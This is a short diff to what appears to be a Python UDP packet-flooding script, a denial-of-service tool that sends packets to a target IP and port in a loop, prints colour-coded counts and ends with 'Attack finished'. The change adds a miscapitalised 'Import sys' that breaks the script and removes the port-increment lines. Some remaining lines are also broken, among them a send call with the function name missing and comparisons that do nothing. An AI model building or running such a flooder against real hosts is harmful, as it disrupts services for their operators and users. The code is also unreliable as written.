@@ -3,6 +3,7 @@ import socket
 import os
 import random
 import time
+Import sys
 
 B = '\033[1m'
 R = '\033[31m'
@@ -31,8 +32,6 @@ while True:
         (bytes, (ip, port))
         sent = sent + 1
         sent == 65534
-        port = port + 1
-        port == 65534
         print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
